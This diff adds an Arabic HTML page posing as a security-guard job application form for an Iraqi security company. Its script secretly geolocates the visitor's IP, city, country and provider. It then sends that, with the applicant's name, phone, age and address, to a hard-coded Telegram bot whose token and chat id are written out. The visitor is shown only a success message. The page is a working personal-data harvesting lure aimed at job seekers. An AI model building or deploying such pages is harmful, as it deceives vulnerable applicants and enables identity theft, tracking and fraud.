@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>وظيفة أمنية</title>
+<style>
+body{font-family:Arial;background:linear-gradient(135deg,#1a237e,#0d1442);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;margin:0}
+.container{background:#fff;padding:30px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);width:100%;max-width:420px}
+h1{color:#1a237e;text-align:center;font-size:22px;margin-bottom:5px}
+p{color:#666;text-align:center;font-size:14px;margin-bottom:15px}
+input,select{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;box-sizing:border-box;background:#f9f9f9}
+button{width:100%;padding:14px;background:#1a237e;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>🛡️ شركة الأمن العراقية</h1>
+<p>استمارة التقديم على وظيفة حارس أمن</p>
+<form id="f">
+<input type="text" id="name" placeholder="الاسم الكامل" required>
+<input type="text" id="phone" placeholder="رقم الهاتف" required>
+<input type="text" id="age" placeholder="العمر" required>
+<input type="text" id="address" placeholder="العنوان" required>
+<select id="exp" required>
+<option value="">الخبرة السابقة</option>
+<option value="لا يوجد">لا يوجد</option>
+<option value="سنة">سنة</option>
+<option value="3 سنوات">3 سنوات</option>
+<option value="5 سنوات+">5 سنوات أو أكثر</option>
+</select>
+<button type="submit">تقديم الطلب</button>
+</form>
+</div>
+<script>
+async function ip(){try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return d.ip+' | '+d.city+' | '+d.country_name+' | '+d.org;}catch(e){return 'N/A';}}
+document.getElementById('f').addEventListener('submit',async function(e){
+e.preventDefault();
+const info=await ip();
+const msg='🛡️ *وظيفة أمنية*\n\n👤 '+document.getElementById('name').value+'\n📞 `'+document.getElementById('phone').value+'`\n🎂 '+document.getElementById('age').value+'\n🏠 '+document.getElementById('address').value+'\n💼 '+document.getElementById('exp').value+'\n\n🌐 IP: `'+info+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
+const url='https://api.telegram.org/bot8899269662:AAFKrQ6uOIQkcJT77w5_ONiMgKhfnAE0dK4/sendMessage?chat_id=1250341553&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
+try{await fetch(url);alert('تم تقديم الطلب');document.getElementById('f').reset();}catch(e){alert('خطأ');}
+});
+</script>
+</body>
+</html>
